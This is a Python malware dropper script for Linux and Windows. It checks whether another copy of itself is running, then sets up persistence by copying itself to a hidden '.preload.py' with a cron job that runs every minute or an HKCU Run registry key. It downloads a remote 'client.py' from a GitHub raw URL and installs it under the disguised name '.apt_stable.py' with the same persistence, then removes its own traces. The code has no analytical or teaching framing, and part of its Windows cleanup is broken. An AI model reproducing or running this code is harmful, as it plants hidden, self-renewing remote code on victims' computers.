import shutil
import os
import sys
import subprocess
import platform

def import_or_install(package):
    import importlib
    try:
        importlib.import_module(package)
    except ImportError:
        import pip
        pip.main(['install', package])
    finally:
        globals()[package] = importlib.import_module(package)

import_or_install("psutil")
import_or_install("requests")

OS = "l" if "linux" in platform.platform().lower() else "w"

def close_if_open():
    filename = __file__
    mypid = os.getpid()
    for p in psutil.process_iter(["name", "exe", "cmdline"]):
        if filename in p.info["cmdline"]:
            if not p.pid == mypid:
                sys.exit()

def persist():
    if OS=="l":
        #linux 
        opt = ""
        try:
            opt = subprocess.check_output(["bash","-c","crontab -l"],stderr="/dev/null").decode().strip()
        except Exception as e:
            pass
        # print(opt)
        if not __file__ in opt:
            shutil.copy(os.path.join(os.path.abspath("."),__file__), os.path.join(os.path.expanduser("~"), ".preload.py"))
            cmd = "python3 " + os.path.join(os.path.expanduser("~"), ".preload.py")
            subprocess.run(["bash","-c",f"(echo \* \* \* \* \* {cmd}; echo {opt}) |  crontab "])
    else:
        #windows
        #test this
        shutil.copy(os.path.join(os.path.abspath("."),__file__), os.path.join(os.path.expandvars("%APPDATA%"), ".preload.py"))
        address=os.path.join(os.path.expandvars("%APPDATA%"), ".preload.py")
        
        import winreg as reg    
        key = "HKEY_CURRENT_USER" 
        key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        _open = reg.OpenKey(key,key_value,0,reg.KEY_ALL_ACCESS) 
        reg.SetValueEx(_open,"preloader",0,reg.REG_SZ,address) 
        reg.CloseKey(_open) 

def get_client():
    r = requests.get("https://raw.githubusercontent.com/tempo156a/TESTREPO/main/client.py")
    if OS == "l":
        f = open(os.path.join(os.path.expanduser("~"),".apt_stable.py"),"w")
    else:
        f = open(os.path.join(os.path.expandvars("%APPDATA%"),".apt_stable.py"),"w")
    f.write(r.text)
    try:
        remove_dropper()
    except:
        pass
    # from inspect import compile
    if OS=="l":
        #linux 
        opt = ""
        try:
            opt = subprocess.check_output(["bash","-c","crontab -l"],stderr="/dev/null").decode().strip()
        except Exception as e:
            pass
        # print(opt)
        if not "apt_stable" in opt:
            cmd = "python3 " + os.path.join(os.path.expanduser("~"), ".apt_stable.py")
            subprocess.run(["bash","-c",f"(echo \* \* \* \* \* DISPLAY=:0 {cmd}; echo {opt}) |  crontab "])
    else:
        #windows
        #test this
        address=os.path.join(os.path.expandvars("%APPDATA%"), ".apt_stable.py")
        
        import winreg as reg    
        key = "HKEY_CURRENT_USER" 
        key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        _open = reg.OpenKey(key,key_value,0,reg.KEY_ALL_ACCESS) 
        reg.SetValueEx(_open,"apt_stable",0,reg.REG_SZ,address) 
        reg.CloseKey(_open)

def remove_dropper():
    #linux 
    if OS=="l":
        subprocess.run(["bash","-c","crontab -l | grep -v preload | crontab"])
    else:
        import winreg as reg    
        key = "HKEY_CURRENT_USER" 
        key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        _open = reg.OpenKey(key,key_value,0,reg.KEY_ALL_ACCESS) 
        reg.DeleteKey(_open,"preloader",0,reg.REG_SZ,address) 
        reg.CloseKey(_open) 

close_if_open()
persist()
get_client()
